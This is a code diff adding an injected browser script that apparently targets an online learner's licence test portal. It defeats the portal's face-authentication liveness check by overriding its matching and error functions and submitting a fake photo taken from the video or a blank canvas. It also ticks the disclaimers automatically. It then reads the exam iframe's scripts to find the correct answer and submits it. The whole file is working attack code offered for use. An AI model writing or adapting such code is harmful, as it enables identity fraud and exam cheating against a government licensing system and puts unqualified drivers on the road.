@@ -1,0 +1,455 @@
+(function persistentInjector() {
+  console.log("🚀 Injected on:", window.location.href);
+
+
+(function () {
+    'use strict';
+
+    let alreadyExecuted = false;
+
+    // 1️⃣ SHA-256 Function
+    async function hashSHA256(str) {
+        const encoder = new TextEncoder();
+        const data = encoder.encode(str);
+        const hashBuffer = await crypto.subtle.digest("SHA-256", data);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        return hashArray.map(b => b.toString(16).padStart(2, "0")).join("");
+    }
+
+    // 2️⃣ Main execution function
+    async function runScript() {
+        if (alreadyExecuted) return;
+        if (!document.body) return;
+
+        const pageText = document.body.innerText;
+
+        if (!pageText.includes("Authenticate") && !pageText.includes("Proceed")) {
+            return; // keep checking
+        }
+
+        alreadyExecuted = true; // prevent multiple runs
+        clearInterval(checkInterval);
+
+        console.log("✅ Required text detected. Running script...");
+
+        const llapplnField = document.querySelector('[name="llappln"]');
+        const entcaptxtField = document.querySelector('[name="entcaptxt"]');
+
+        if (!llapplnField || !entcaptxtField) {
+            console.error("❌ Required input fields not found.");
+            return;
+        }
+
+        const llappln = llapplnField.value.trim();
+        const entcaptxt = entcaptxtField.value.trim();
+
+        if (!llappln || !entcaptxt) {
+            console.error("❌ llappln or entcaptxt is empty.");
+            return;
+        }
+
+        const faceAuthString = llappln + entcaptxt;
+        console.log("🔹 Combined String:", faceAuthString);
+
+        try {
+            const faceAuthStatus = await hashSHA256(faceAuthString);
+            console.log("🔐 Generated Hash:", faceAuthStatus);
+
+            const response = await fetch("faceAuthStatus.do", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: "faceAuthStatus=" + encodeURIComponent(faceAuthStatus)
+            });
+
+            const result = await response.text();
+            console.log("✅ Server Response:", result);
+
+        } catch (error) {
+            console.error("❌ Error:", error);
+        }
+    }
+
+    // 3️⃣ Check every 500ms
+    const checkInterval = setInterval(runScript, 500);
+
+})();
+
+
+
+
+
+
+
+
+
+  // ✅ 1. Face Authentication Bypass
+  (function() {
+    console.log("🔓 Enhanced face authentication bypass v7 activated");
+    
+    // Wait for all required elements and scripts to load
+    const waitForElements = setInterval(() => {
+        if (typeof aware !== 'undefined' && 
+            document.querySelector('video') && 
+            document.getElementById('message')) {
+            
+            clearInterval(waitForElements);
+            console.log("✅ Required elements found, starting bypass");
+            executeBypass();
+        }
+    }, 500);
+    
+    function executeBypass() {
+        // 1. Set all success state variables immediately
+        window.isGenuine = true;
+        window.realFaceCount = 30;
+        window.spoofFaceCount = 0;
+        window.totalChecks = 40;
+        window.smileCounter = 5;
+        window.blinkCount = 5;
+        window.eyesClosed = 0;
+        window.matchCount = 1;
+        
+        // 2. Create a fake photo from the video
+        const video = document.querySelector('video');
+        let fakePhoto = null;
+        
+        if (video && video.readyState >= 2) {
+            const tempCanvas = document.createElement('canvas');
+            tempCanvas.width = video.videoWidth || 300;
+            tempCanvas.height = video.videoHeight || 300;
+            const tempCtx = tempCanvas.getContext('2d');
+            tempCtx.drawImage(video, 0, 0, tempCanvas.width, tempCanvas.height);
+            fakePhoto = tempCanvas.toDataURL("image/jpeg", 0.5);
+            console.log("✅ Created fake photo from video");
+        } else {
+            // Create a blank canvas as fallback
+            const tempCanvas = document.createElement('canvas');
+            tempCanvas.width = 300;
+            tempCanvas.height = 300;
+            const tempCtx = tempCanvas.getContext('2d');
+            tempCtx.fillStyle = "#ffffff";
+            tempCtx.fillRect(0, 0, 300, 300);
+            fakePhoto = tempCanvas.toDataURL("image/jpeg", 0.5);
+            console.log("⚠ Created blank photo as fallback");
+        }
+        
+        // 3. Store original functions
+        const originalAjax = $.ajax;
+        const originalInsertfeceauth = window.insertfeceauth;
+        
+        // 4. Override the critical function that checks server response
+        window.checkServerResponse = function(response) {
+            console.log("🔄 Intercepted server response check:", response);
+            // Always return null regardless of actual response
+            return null;
+        };
+        
+        // 5. Override the function that shows error message
+        window.showFaceAuthError = function() {
+            console.log("🔄 Intercepted error display - preventing error message");
+            // Don't show any error message
+            return false;
+        };
+        
+        // 6. Override aware.match to simulate original flow
+        const originalMatch = window.aware.match;
+        window.aware.match = function() {
+            console.log("🔄 Intercepted aware.match with simulated flow");
+            
+            return new Promise((resolve, reject) => {
+                // Simulate the complete authentication process
+                setTimeout(() => {
+                    console.log("✅ Spoof detection completed.Genuine face detected.");
+                    
+                    setTimeout(() => {
+                        console.log("✅ Smile detection completed.");
+                        
+                        setTimeout(() => {
+                            console.log("✅ blinkCount---5---smileCounter---5---true");
+                            
+                            // Create intermediate result
+                            const intermediateResult = {
+                                isMatch: true,
+                                message: "Validation is in process, Please Wait ............",
+                                nextExp: "",
+                                photo: fakePhoto
+                            };
+                            
+                            // Update UI with intermediate message
+                            if (window.messageToShown) {
+                                window.messageToShown.innerHTML = intermediateResult.message;
+                            }
+                            
+                            // Simulate server communication
+                            setTimeout(() => {
+                                console.log("✅ Server response: true");
+                                
+                                // Final result
+                                const finalResult = {
+                                    isMatch: true,
+                                    message: "Click on Proceed to validate your credentials",
+                                    nextExp: "",
+                                    photo: fakePhoto
+                                };
+                                
+                                // Update UI with final message
+                                if (window.messageToShown) {
+                                    window.messageToShown.innerHTML = finalResult.message;
+                                }
+                                
+                                // Send data to server but override the response handling
+                                const llappln = document.getElementById('llappln')?.value || '';
+                                const rtocode = document.getElementById('rtocode')?.value || '';
+                                
+                                console.log("📤 Sending data to saveFaceAuthData.do");
+                                
+                                // Make the actual AJAX request but override response handling
+                                originalAjax({
+                                    type: 'POST',
+                                    url: 'saveFaceAuthData.do',
+                                    data: {
+                                        applno: llappln,
+                                        rtocode: rtocode,
+                                        faceres: 1,
+                                        CapPho: fakePhoto
+                                    },
+                                    dataType: 'json',
+                                    success: function(actualResponse) {
+                                        console.log("✅ Actual server response:", actualResponse);
+                                        
+                                        // Force the response to be treated as null
+                                        const nullResponse = null;
+                                        
+                                        console.log("🔄 Forcing response to be treated as null");
+                                        
+                                        // Enable proceed button (this should happen when null response is received)
+                                        if (document.getElementById('capphto1')) {
+                                            document.getElementById('capphto1').disabled = false;
+                                            console.log("✅ Proceed button enabled");
+                                        }
+                                        
+                                        // Disable authenticate button
+                                        if (document.getElementById('capphto')) {
+                                            document.getElementById('capphto').disabled = true;
+                                        }
+                                        
+                                        resolve(finalResult);
+                                    },
+                                    error: function(xhr, status, error) {
+                                        console.log("⚠ AJAX error but still enabling proceed button");
+                                        
+                                        // Even on error, enable proceed button
+                                        if (document.getElementById('capphto1')) {
+                                            document.getElementById('capphto1').disabled = false;
+                                        }
+                                        
+                                        resolve(finalResult);
+                                    }
+                                });
+                                
+                            }, 1000);
+                            
+                        }, 500);
+                        
+                    }, 500);
+                    
+                }, 500);
+            });
+        };
+        
+        // 7. Override insertfeceauth function to handle response properly
+        window.insertfeceauth = function(faceresult, llappln, rtocode, result_photo) {
+            console.log("🔄 Intercepted insertfeceauth");
+            
+            // Get values if not provided
+            llappln = llappln || document.getElementById('llappln')?.value || '';
+            rtocode = rtocode || document.getElementById('rtocode')?.value || '';
+            result_photo = result_photo || fakePhoto;
+            
+            // Make the actual AJAX request but handle response to avoid errors
+            originalAjax({
+                type: 'POST',
+                url: 'saveFaceAuthData.do',
+                data: {
+                    applno: llappln,
+                    rtocode: rtocode,
+                    faceres: 1,
+                    CapPho: result_photo
+                },
+                dataType: 'json',
+                success: function(actualResponse) {
+                    console.log("✅ Actual server response in insertfeceauth:", actualResponse);
+                    
+                    // Force the response to be treated as successful regardless of actual response
+                    console.log("🔄 Bypassing response validation - treating as success");
+                    
+                    // Enable proceed button
+                    if (document.getElementById('capphto1')) {
+                        document.getElementById('capphto1').disabled = false;
+                        console.log("✅ Proceed button enabled");
+                    }
+                    
+                    // Disable other elements
+                    if (document.getElementById('capphto')) {
+                        document.getElementById('capphto').disabled = true;
+                    }
+                },
+                error: function(xhr, status, error) {
+                    console.log("⚠ Error in insertfeceauth but still enabling button");
+                    
+                    // Even on error, enable proceed button
+                    if (document.getElementById('capphto1')) {
+                        document.getElementById('capphto1').disabled = false;
+                    }
+                }
+            });
+            
+            return true;
+        };
+        
+        // 8. Override the function that displays authentication error
+        const originalShowError = window.showAuthenticationError;
+        window.showAuthenticationError = function(message) {
+            if (message === "Face Authentication is not Successful, Please Authenticate your face before proceeding with the LL Test") {
+                console.log("🔄 Blocking face authentication error message");
+                return false; // Don't show the error
+            }
+            return originalShowError.apply(this, arguments);
+        };
+        
+        // 9. Start the authentication process automatically
+        console.log("🚀 Starting authentication process");
+        window.aware.match();
+    }
+})();
+  // ✅ 2. Language + Checkbox + Continue (after 4s)
+  setTimeout(() => {
+    console.log("⏭️ Running autoPageActions...");
+    function autoPageActions() {
+      const interval = setInterval(() => {
+        const langSelect = document.getElementById("language");
+        if (langSelect && langSelect.value !== "ENGLISH") {
+          const hindiOption = Array.from(langSelect.options).find(
+            (opt) => opt.value === "ENGLISH"
+          );
+          if (hindiOption) {
+            langSelect.value = "ENGLISH";
+            langSelect.dispatchEvent(new Event("change", { bubbles: true }));
+            console.log("[✓] Language set to Hindi");
+          }
+        }
+
+        const checkbox1 = document.querySelector('input[name="disclaimer1"]');
+        const checkbox2 = document.querySelector('input[name="disclaimer2"]');
+
+        if (checkbox1 && !checkbox1.checked) {
+          checkbox1.checked = true;
+          checkbox1.dispatchEvent(new Event("click", { bubbles: true }));
+          console.log("[✓] disclaimer1 checked");
+        }
+
+        if (checkbox2 && !checkbox2.checked) {
+          checkbox2.checked = true;
+          checkbox2.dispatchEvent(new Event("click", { bubbles: true }));
+          console.log("[✓] disclaimer2 checked");
+        }
+
+        const continueBtn = document.getElementById("subm");
+        if (continueBtn && !continueBtn.disabled) {
+          continueBtn.click();
+          console.log("[✓] CONTINUE clicked (id=subm)");
+          clearInterval(interval);
+          return;
+        }
+
+        const altBtn = document.querySelector(
+          'input[type="submit"][value="CONTINUE"]:not([disabled])'
+        );
+        if (altBtn) {
+          altBtn.click();
+          console.log("[✓] CONTINUE clicked (no id)");
+          clearInterval(interval);
+        }
+      }, 1000);
+    }
+
+    autoPageActions();
+  }, 10);
+
+  // ✅ 3. Exam iframe watcher (after 10s)
+  setTimeout(() => {
+    console.log("📘 Watching exam iframe");
+
+    function injectExamScript() {
+      const iframe = document.querySelector("iframe#stallexam");
+      if (!iframe) return;
+
+      function detectAndSubmit() {
+        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+        if (!iframeDoc) return;
+
+        const scripts = Array.from(iframeDoc.getElementsByTagName("script"));
+        let correctId = null;
+
+        for (const script of scripts) {
+          const code = script.textContent;
+          const match = code.match(
+            /document\.getElementById\("stallradio(\d+)"\)\.style\.visibility\s*=\s*['"]hidden['"]/
+          );
+          if (match) {
+            correctId = `stallradio${match[1]}`;
+            break;
+          }
+        }
+
+        if (correctId) {
+          const radio = iframeDoc.getElementById(correctId);
+          if (radio) {
+            radio.checked = true;
+            console.log("✅ Selected correct:", correctId);
+
+            const confirmBtn = iframeDoc.getElementById("confirmbut");
+            if (confirmBtn) {
+              confirmBtn.disabled = false;
+              confirmBtn.click();
+            }
+
+            if (typeof iframeDoc.StallExam !== "undefined") {
+              console.log("🚀 Submitting form...");
+              iframeDoc.StallExam.submit();
+            }
+          }
+        } else {
+          console.log("❌ No correct answer found");
+        }
+      }
+
+      iframe.addEventListener("load", () => {
+        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+        if (!iframeDoc) return;
+
+        const observer = new MutationObserver(() => detectAndSubmit());
+        observer.observe(iframeDoc.documentElement, {
+          childList: true,
+          subtree: true,
+        });
+
+        setTimeout(() => detectAndSubmit(), 10);
+      });
+
+      if (iframe.contentDocument?.readyState === "complete") {
+        setTimeout(() => detectAndSubmit(), 10);
+      }
+    }
+
+    const iframeChecker = setInterval(() => {
+      const iframe = document.querySelector("iframe#stallexam");
+      if (iframe) {
+        injectExamScript();
+        clearInterval(iframeChecker);
+      }
+    }, 50);
+  }, 50);
+})();
